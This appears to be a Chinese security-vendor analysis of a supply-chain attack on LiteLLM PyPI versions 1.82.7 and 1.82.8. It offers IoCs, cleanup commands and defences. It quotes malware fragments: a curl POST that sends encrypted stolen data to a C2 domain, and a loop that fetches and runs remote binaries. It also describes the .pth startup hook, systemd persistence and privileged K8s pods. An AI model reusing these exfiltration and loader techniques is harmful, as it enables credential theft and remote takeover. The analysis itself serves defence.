---
title: 深度解析：LiteLLM 供应链投毒事件——TeamPCP 三阶段后门全链路分析
url: https://mp.weixin.qq.com/s/LDxc2AU_8_650Qso70qyNA
source: Doonsec's feed
date: 2026-03-25
fetch_date: 2026-03-26T04:29:40.770309
---

# 深度解析：LiteLLM 供应链投毒事件——TeamPCP 三阶段后门全链路分析

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/X4coLUhcXJHfwnn75gaM7eBLLV6PGrHqtJS2KQSuicIQlxlNgu3WYibmwrbjtNDjEdrx1VGKOYscdicc05CmhsyLwPyzicl4kzZiatRs554W68QE/0?wx_fmt=jpeg)

# 深度解析：LiteLLM 供应链投毒事件——TeamPCP 三阶段后门全链路分析

阿里云安全

![]()

在小说阅读器中沉浸阅读

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/X4coLUhcXJHY0AzC6fKlnDSpH3eDs9PR1fCFzlw2YC3gNiaRgWwKtYT3jlRPUoibiawtZbwHgib3g44WthZJFVNnoaHpwicf5N23OCacjZ3PWzDQ/640?wx_fmt=gif&from=appmsg)

**事件概述**

2026年3月24日，互联网上披露热门Python AI框架**LiteLLM**（PyPI累计下载量超4.8亿次）遭到供应链攻击。攻击者将**LiteLLM****1.82.7**和**1.82.8**两个版本的恶意包上传至PyPI，包内植入多阶段后门程序。经溯源分析，此次攻击与近期活跃的**TeamPCP**供应链攻击组织高度关联，且C2地址、加密方式、后门脚本与此前该组织对npm生态的攻击手法如出一辙。

目前PyPI已对LiteLLM受影响版本执行隔离。

**阿里云云安全中心和云防火墙已在第一时间上线相关检测与拦截策略，并持续监控事态发展。**

**影响面分析**

**##*****##****##**

##***## **为什么这次事件这么严重？*****##

**##****##*****##**

**LiteLLM**是当前AI生态中最核心的Python中间件之一，其影响面数据令人警惕：

![](https://mmbiz.qpic.cn/mmbiz_jpg/X4coLUhcXJEv20fBic2IaZ2hFiaNXIAmwa9VryOMuoW6VwicRraFuAmkiaFSRQyK8oZVmLnnCJLG2Xfib7t2ia7Iob2qpSq9ticaZzCZfPbPJmib7X0/640?wx_fmt=jpeg&from=appmsg)

LiteLLM的定位是LLM统一网关，企业用户通常将其部署在**生产环境的核心链路上**，作为调用OpenAI、Anthropic、Azure、VertexAI等100+大模型API的统一入口。这意味着：

1. **受害者多为企业级用户**——个人开发者很少需要LLM网关，使用LiteLLM的绝大多数是中大型企业的AI基础设施。
2. **运行环境通常持有大量高价值凭证**——LiteLLM代理本身需要配置各大云厂商的API Key、数据库连接串、K8s集群凭证等，恰好是恶意载荷重点窃取的目标。
3. **部署位置敏感**——大量用户将LiteLLM部署在K8s集群中，攻击者的第三阶段Payload会利用这一点横向感染整个集群。
4. **AI供应链已成靶场**——作为AI开发链条上的关键节点，LiteLLM被攻陷等同于攻击者获得了通向下游数万家企业AI基础设施的跳板。

近日高下载量意味着，恶意版本在PyPI上线的每一分钟，都有潜在的受害者中招。这是TeamPCP选择LiteLLM作为攻击目标的核心原因——**高价值、高权限、高渗透面。**

**投毒入口：投毒路径分析**

**##*****##****##**

##***##**

此次攻击的关键特征在于 “**Wheel包独有投毒”**：

* **PyPI Wheel包中****：**包含完整的恶意代码，包括litellm\_init.pth（Python 启动钩子）和被篡改的proxy\_server.py，构成三阶段后门攻击链。
* **GitHub源码仓库中****：**恶意代码未完全提交至公开仓库，仅存在窃取凭证的有限操作步骤（可见于fcaa823提交）。

这意味着：

1. 攻击者**绕过了正常的Git提交流程**，直接在构建/发布环节篡改了Wheel包。
2. 仅通过审计GitHub源码**无法发现**完整的恶意载荷。
3. **任何依赖PyPI安装（pip install litellm）而非从源码构建的系统均受影响。**

**可能的入侵路径**

LiteLLM在其CI/CD流水线中使用了Trivy进行安全扫描（见ci\_cd/security\_scans.sh）。考虑到Trivy近期同样被证实遭到TeamPCP攻击，攻击者极有可能通过以下链路完成投毒：

```
Trivy被攻陷 → litellm CI/CD环境受影响 → Wheel构建阶段注入恶意代码 → 上传至PyPI
```

**恶意载荷技术分析**

**第一阶段：初始之行**

恶意代码通过两个入口触发：

**入口一：`litellm_init.pth`（Python路径初始化钩子）**

* `.pth`文件在Python解释器启动时自动执行。
* 无需用户显式调用任何函数，`import litellm`即触发。

**入口二：`proxy_server.py`（被篡改的代理服务器入口）**

* 在正常启动流程中嵌入base64编码的载荷。
* 启动代理服务时同步执行恶意代码。

载荷解码后写入临时文件，通过以下方式执行：

```
subprocess.run([sys.executable, p])
```

**第二阶段：信息窃取与加密外传**

第二阶段执行全面的主机信息采集，涵盖范围极广：

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/X4coLUhcXJHDD7ncOhSZcee5ybxl2dP7QQbhNLfWN4pjoOfdcODvgIBG3Z0NmbXNGsUBtNax8Iiao8zRcDybK6HDmOB29AEz3y5jcUIxePlU/640?wx_fmt=jpeg&from=appmsg)

**数据加密与外传机制：**

```
# 生成随机 AES 密钥subprocess.run(["openssl", "rand", "-out", sk, "32"])# AES-256-CBC 加密采集数据subprocess.run(["openssl", "enc", "-aes-256-cbc", "-in", collected, "-out", ef,                 "-pass", f"file:{sk}", "-pbkdf2"])# RSA-4096 加密 AES 密钥（信封加密）subprocess.run(["openssl", "pkeyutl", "-encrypt", "-pubin", "-inkey", pk,                 "-in", sk, "-out", ek, "-pkeyopt", "rsa_padding_mode:oaep"])# 打包并通过 curl 上传至 C2subprocess.run(["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", "-X", "POST",                "https://models.litellm.cloud/",                "-H", "Content-Type: application/octet-stream",                "-H", "X-Filename: tpcp.tar.gz",                "--data-binary", f"@{bn}"])
```

采用**AES-256-CBC + RSA-4096信封加密**方案，确保仅有持有私钥的攻击者可解密数据。

**第三阶段：****持久化与二次载荷投递**

**本地持久化（非K8s环境）：**

* 安装路径：~/.config/sysmon/sysmon.py
* 注册为systemd用户服务：sysmon.service（伪装为"System Telemetry Service"）。

**K8s环境持久化：**

* 检测到Service Account Token后，遍历所有K8s节点。
* 在kube-system命名空间部署名为node-setup-\* 的特权Pod。
* 每个Pod挂载宿主机根文件系统（/），通过chroot植入持久化后门。

**二次载荷拉取机制：**

```
# 首次等待 300 秒后进入循环req = urllib.request.Request("https://checkmarx.zone/raw",                              headers={'User-Agent': 'Mozilla/5.0'})# 每 3000 秒（约50分钟）轮询一次# 下载二进制到 /tmp/pglog，赋予执行权限后以独立会话运行subprocess.Popen([TARGET], stdout=subprocess.DEVNULL,                  stderr=subprocess.DEVNULL, start_new_session=True)
```

通过checkmarx.zone/raw轮询获取远程指令，下载任意二进制载荷执行，实现完全远程控制。状态追踪文件位于/tmp/.pg\_state，避免重复下载。

**C2基础设施分析**

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/X4coLUhcXJE12ibepeVONbLiciaADicVtaBeWGnzunvEnBzvJF3lrXpGanI5RzjgAt1sF9icJTcib0uKHAzeWu4eH0GoodzuZF0GU9VecuIibdBTaE/640?wx_fmt=jpeg&from=appmsg)

攻击者精心设计了C2域名，使其看起来像是LiteLLM和Checkmarx的合法域名，增加安全事件响应的混淆难度。这是TeamPCP的一贯手法。

**GitHub仓库与PyPI包的差异**

这是本次事件中一个极为重要的技术细节：

**GitHub仓库**（**fcaa823****提交**）**中仅包含凭证窃取步骤**，而完整的恶意载荷（litellm\_init.pth 和被修改的 proxy\_server.py）**仅存在于PyPI的Wheel包中**，尚未提交到GitHub源码仓库。

这意味着：

1. **常规的源码审计手段对此次攻击失效**——仅审计GitHub仓库无法发现完整攻击链。
2. 攻击者通过**构建环节投毒**（而非源码投毒），绕过了基于Git历史的安全检测。
3. 企业需要建立**制品层安全检测能力**，对Wheel包本身进行二进制/制品完整性验证，而不能仅依赖源码扫描。

**影响范围评估**

* **受影响版本：**litellm 1.82.7、1.82.8。
* **受影响平台：**所有通过`pip install`安装上述版本的环境。
* **高危场景：**

+ 云原生/K8s环境中运行LiteLLM代理（触发特权Pod部署）。
+ 存储云厂商凭证的开发/生产环境（AWS/GCP/Azure凭证全量窃取）。
+ CI/CD流水线中引用LiteLLM（泄露基础设施密钥）。

**阿里云安全响应**

阿里云云安全中心和云防火墙已在第一时间完成以下响应：

**1.检测策略上线**：云安全中心已上线针对`litellm 1.82.7` / `1.82.8` 的恶意包检测规则，支持自动识别受影响主机。

![4.png](https://mmbiz.qpic.cn/mmbiz_png/X4coLUhcXJFcsDLunueEERy6d72eREKDE9cNHh2vgF18gNv6XcLvEo8Fg9ibvwvO9O7Zr13ECOeTibV3cuEYhZfVq9rB5eaNyLp4IhH80u2AE/640?wx_fmt=png&from=appmsg)

**2.网络拦截**：云防火墙已阻断`models.litellm.cloud`和`checkmarx.zone`两个C2域名的出站连接。

![5.png](https://mmbiz.qpic.cn/sz_mmbiz_png/X4coLUhcXJGIMNPCEHicxUibAs3o0dnFSx1tXSTsazasU37V2DrfjNV0gBtKwtAqDvOyelibbd8enHN0yMWRc0KnENF3YX1LxETkw1e7xA26HA/640?wx_fmt=png&from=appmsg)

**3.持久化清除检测**：支持检测`sysmon.service`恶意systemd服务及K8s中`node-setup-*` 特权Pod。

**4.持续监控**：对TeamPCP组织的最新攻击活动进行持续追踪和情报更新。

**修复建议**

**紧急处置**

**1.版本排查：**立即检查所有环境，执行pip show litellm，确认是否安装1.82.7或1.82.8。

**2.降级处理：**如发现受影响版本，立即降级至已知安全的版本。

**3.主机隔离：**对已执行受影响版本的主机进行隔离，假定全部凭证已泄露。

**清除持久化**

```
# 停止并禁用恶意 systemd 服务systemctl --user stop sysmon.servicesystemctl --user disable sysmon.service# 删除恶意文件rm -rf ~/.config/sysmon/sysmon.pyrm -f ~/.config/systemd/user/sysmon.servicekill -9 $(pgrep -f /tmp/pglog)rm -f /tmp/pglog /tmp/.pg_state
```

**K8s环境检查**

```
# 检查并删除 kube-system 中的恶意 Podkubectl get pods -n kube-system | grep node-setupkubectl delete pod -n kube-system <pod-name># 检查所有节点上的持久化后门# （需在节点上执行）ls -la /root/.config/sysmon/
```

**凭证轮换**

鉴于窃取范围极广，建议 **全面轮换** 以下凭证：

* AWS/GCP/Azure云厂商API Key和访问凭证；
* Kubernetes集群证书和Service Account Token；
* SSH密钥对；
* Git凭证和CI/CD Token；
* 数据库密码；
* TLS/SSL私钥。

**网络层防护**

在防火墙/DNS层面封禁以下域名：

* models.litellm.cloud
* checkmarx.zone

****安全建议**

**##*****##****##**

##***## **构建供应链安全防线******

此次事件再次暴露了软件供应链攻击的严峻形势。针对AI生态（特别是LLM框架）日益成为攻击目标，建议企业：

**1.产品层安全扫描**：不要仅依赖源码审计，必须对最终制品（Wheel/JAR/NPM包）进行完整性校验和安全扫描；

**2.依赖锁定与签名验证**：使用`pip --require-hashes`锁定依赖哈希，启用PyPI包签名验证；

**3.最小权限原则**：限制CI/CD环境和运行时环境的权限，特别是K8s RBAC，避免Pod获得宿主机挂载权限；

**4.网络出站管控**：对云服务器出站流量实施白名单策略，阻断未知C2通信；

**5.持续监控**：部署运行时安全检测，监控异常进程创建、systemd服务注册、K8s特权Pod创建等行为。

**IoC(威胁指标）**

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/X4coLUhcXJHs4sq1YcVQCOiaXVGHvS4Ildia8xlyHice4XAtjBOGicOBmVCo8vr6LjOtCbXicb1oiceTicOUUub6I8iaKWR0ZjEvnWiaA5gbiczbHHT0s/640?wx_fmt=jpeg&from=appmsg)

**关于我们**

如需了解更多或申请体验，欢迎体验：

云安全中心

https://www.aliyun.com/product/security-center。

云防火墙

https://www.aliyun.com/product/cloud-firewall。

预览时标签不可点

阅读原文

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/XXR4zia5yICHPGgzZ5JhLCo6qFCD9ogdgADkr9cxv7yb3mKhJntlEtQS8lr6o0FUT1j3TwySxHLcDM1fs8VhCLw/0?wx_fmt=png)

阿里云安全

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/XXR4zia5yICHPGgzZ5JhLCo6qFCD9ogdgADkr9cxv7yb3mKhJntlEtQS8lr6o0FUT1j3TwySxHLcDM1fs8VhCLw/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过